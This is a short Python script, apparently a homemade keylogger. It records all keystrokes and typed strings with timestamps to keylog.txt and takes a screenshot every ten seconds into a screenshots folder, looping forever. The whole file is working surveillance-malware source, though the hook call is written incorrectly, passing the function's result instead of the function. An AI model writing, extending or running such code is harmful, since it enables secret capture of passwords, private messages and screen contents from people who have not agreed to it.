import keyboard
import datetime
import os
import time
import pyautogui

# opens a textfile to write the data. (!!!write mode currently on "w" should later be changed into "a"!!!)
file = open("./keylog.txt", "w", encoding="utf-8")


# defines function (on_key) tracking keys on wished format
def on_key():
    # ------------------------------writes current datetime in the beginning of log entry
    now = datetime.datetime.today()
    file.write(str(now))
    # ------------------------------

    events = keyboard.record()  # adds all keyboard events in a list
    keywords = list()
    allkeys = list()

    # ----loop gets just the value of any keyboard event appends it to a list and then writes it on the logfile
    for i in keyboard.get_typed_strings(events, allow_backspace=True):
        keywords.append(i)
        file.write("\n")
        file.write(i)
    # ----------------------------------------

    # write lists to file and "end" datetime---
    file.write("\n")
    file.write(str(events))
    file.write("\n")
    file.write(str(now))
    # ------------------------------------------


# calls the function (on_key) whenever a key is pressed
keyboard.hook(on_key())


#screenshot maker

if not os.path.exists("./screenshots"):
    os.mkdir("./screenshots")

while True:
    time.sleep(10)
    current = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = "./screenshots/" + current + ".jpg"
    pyautogui.screenshot(filename)
